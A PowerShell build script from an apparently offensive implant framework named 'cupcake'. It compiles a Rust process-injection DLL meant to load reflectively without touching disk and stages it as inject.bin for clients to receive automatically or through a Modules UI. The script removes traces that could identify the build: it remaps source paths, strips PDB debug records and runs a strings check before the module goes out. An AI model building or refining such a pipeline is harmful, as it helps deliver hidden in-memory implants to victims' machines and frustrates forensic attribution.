# Build L2 inject worker PE → storage/modules/inject.bin
#
# Product artifact: cupcake_mod_inject.dll (cdylib, reflective/zero-disk path).
# Legacy cupcake-inject-worker.exe is no longer the primary output.
#
# Usage: powershell -File scripts/build-inject-module.ps1
param(
    [switch]$SkipGate
)

$ErrorActionPreference = 'Stop'
$ServerRoot = Split-Path -Parent $PSScriptRoot
$RepoRoot   = Split-Path -Parent $ServerRoot
$ClientRoot = Join-Path $RepoRoot 'Client'
$OutDir     = Join-Path $ServerRoot 'storage\modules'
$Pkg        = 'cupcake-mod-inject'
$SrcName    = 'cupcake_mod_inject.dll'
$DstName    = 'inject.bin'
$StripPy    = Join-Path $PSScriptRoot 'pe-strip-debug.py'
$Gate       = Join-Path $ClientRoot 'scripts\strings-gate.ps1'

if (-not (Test-Path $ClientRoot)) { throw "Client tree not found: $ClientRoot" }

Write-Host "[*] cargo build -p $Pkg --release"
Push-Location $ClientRoot
try {
    $env:RUSTFLAGS = "--remap-path-prefix `"$ClientRoot`"=."
    cargo build -p $Pkg --release
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
} finally {
    Pop-Location
}

$src = Join-Path $ClientRoot "target\release\$SrcName"
if (-not (Test-Path $src)) {
    # fallback legacy names
    foreach ($alt in @('cupcake-inject-worker.exe', 'cupcake_mod_inject.dll')) {
        $c = Join-Path $ClientRoot "target\release\$alt"
        if (Test-Path $c) { $src = $c; break }
    }
}
if (-not (Test-Path $src)) { throw "built inject PE not found (expected $SrcName)" }

New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
$dst = Join-Path $OutDir $DstName
Copy-Item -Force $src $dst

if (Test-Path $StripPy) {
    Write-Host '[*] stripping PE debug directory (RSDS/PDB)'
    python $StripPy $dst
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
}

Write-Host "[+] Installed $dst ($((Get-Item $dst).Length) bytes) from $(Split-Path $src -Leaf)"
Write-Host '    Push via Modules UI or auto on module_required:inject'

if (-not $SkipGate -and (Test-Path $Gate)) {
    & $Gate -Path $dst
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
}
